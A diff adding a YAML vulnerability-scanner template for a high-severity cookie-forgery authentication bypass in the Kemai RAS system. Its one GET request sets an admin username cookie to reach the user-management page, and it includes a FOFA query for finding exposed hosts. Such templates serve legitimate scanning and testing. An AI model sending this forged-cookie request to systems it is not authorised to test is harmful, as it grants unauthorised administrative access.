@@ -1,0 +1,26 @@
+id: poc-yaml-ke-mai-ras-system-cookie-unauthorized-access
+info:
+  name: 科迈 RAS系统 Cookie验证越权漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: 科迈 RAS
+  fofa: app="科迈-RAS系统"
+requests:
+- method: GET
+  path: /Server/CmxUser.php?pgid=UserList
+  headers:
+    Cookie: RAS_Admin_UserInfo_UserName=admin
+  expression: 'status_code == 200
+
+    && contains(title,"用户 - 科迈RAS企业版服务器端")
+
+    && contains(body,"添加用户")
+
+    && contains(body,"admin")
+
+    && contains(body,"应用程序")
+
+    '
+variables: {}
+transport: http
